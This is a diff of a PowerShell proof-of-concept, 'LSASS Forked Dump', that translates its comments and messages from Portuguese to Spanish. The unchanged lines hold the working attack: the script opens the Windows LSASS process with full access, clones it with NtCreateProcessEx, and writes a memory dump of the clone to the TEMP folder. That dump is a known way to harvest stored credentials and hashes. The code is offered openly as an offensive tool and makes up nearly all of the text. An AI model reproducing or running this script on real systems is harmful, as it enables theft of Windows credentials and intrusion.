@@ -2,17 +2,19 @@
 #     LSASS Forked Dump - PoC V 1.0
 #     Autor: Willian Oliveira
 #     Empresa: Escola hack3r 
+#     Traducido por: sezio (sergiovks)
 # ================================================
 
 Write-Host "===============================================" -ForegroundColor Cyan
-Write-Host "           LSASS Forked Dump - PoC - V 1.0     " -ForegroundColor Cyan
-Write-Host "           Autor: Willian Oliveira             " -ForegroundColor Cyan
-Write-Host "           Empresa: Escola hack3r              " -ForegroundColor Cyan
+Write-Host "         LSASS Forked Dump - PoC - V 1.0       " -ForegroundColor Cyan
+Write-Host "         Autor: Willian Oliveira               " -ForegroundColor Cyan
+Write-Host "         Empresa: Escola hack3r                " -ForegroundColor Cyan
+Write-Host "         Traducido por: sezio (sergiovks)      " -ForegroundColor Cyan
 Write-Host "===============================================" -ForegroundColor Cyan
 Write-Host ""
 
-# Definição da classe com P/Invoke
-Write-Host "[*] Carregando definições de API..." -ForegroundColor Yellow
+# Definición de la clase con P/Invoke
+Write-Host "[*] Cargando definiciones de API..." -ForegroundColor Yellow
 
 Add-Type -TypeDefinition @"
 using System;
@@ -49,46 +51,46 @@ public class LSASSForkDump {
 }
 "@
 
-Write-Host "[+] API carregada com sucesso." -ForegroundColor Green
+Write-Host "[+] API cargada con éxito." -ForegroundColor Green
 Write-Host ""
 
-# Abrir o processo LSASS
-Write-Host "[*] Tentando abrir o processo LSASS..." -ForegroundColor Yellow
+# Abrir el proceso LSASS
+Write-Host "[*] Intentando abrir el proceso LSASS..." -ForegroundColor Yellow
 $lsass = Get-Process lsass
 $lsassHandle = [LSASSForkDump]::OpenProcess(0x001F0FFF, $false, $lsass.Id) # PROCESS_ALL_ACCESS
 
 if ($lsassHandle -eq [IntPtr]::Zero) {
-    Write-Host "[!] Falha ao abrir o processo LSASS!" -ForegroundColor Red
+    Write-Host "[!] Error al abrir el proceso LSASS!" -ForegroundColor Red
     return
 } else {
-    Write-Host "[+] Processo LSASS aberto com sucesso." -ForegroundColor Green
+    Write-Host "[+] Proceso LSASS abierto con éxito." -ForegroundColor Green
 }
 
 Write-Host ""
 
-# Clonar o processo LSASS
-Write-Host "[*] Tentando clonar o processo LSASS..." -ForegroundColor Yellow
+# Clonar el proceso LSASS
+Write-Host "[*] Intentando clonar el proceso LSASS..." -ForegroundColor Yellow
 [IntPtr]$forkedHandle = [IntPtr]::Zero
 $ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$forkedHandle, 0x001F0FFF, [IntPtr]::Zero, $lsassHandle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)
 
 if ($forkedHandle -eq [IntPtr]::Zero) {
-    Write-Host "[!] Falha ao clonar o processo LSASS!" -ForegroundColor Red
+    Write-Host "[!] Error al clonar el proceso LSASS!" -ForegroundColor Red
     return
 } else {
-    Write-Host "[+] Processo LSASS clonado com sucesso." -ForegroundColor Green
+    Write-Host "[+] Proceso LSASS clonado con éxito." -ForegroundColor Green
 }
 
 Write-Host ""
 
-# Dumpar o clone
-Write-Host "[*] Criando o dump do processo clonado..." -ForegroundColor Yellow
+# Crear el volcado del clon
+Write-Host "[*] Creando el volcado del proceso clonado..." -ForegroundColor Yellow
 $dumpPath = "$env:TEMP\forked_lsass.dmp"
 $fs = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
 $success = [LSASSForkDump]::MiniDumpWriteDump($forkedHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
 $fs.Close()
 
 if ($success) {
-    Write-Host "[+] Dump criado com sucesso em: $dumpPath" -ForegroundColor Green
+    Write-Host "[+] Volcado creado con éxito en: $dumpPath" -ForegroundColor Green
 } else {
-    Write-Host "[!] Falha ao criar o dump!" -ForegroundColor Red
+    Write-Host "[!] Error al crear el volcado!" -ForegroundColor Red
 }
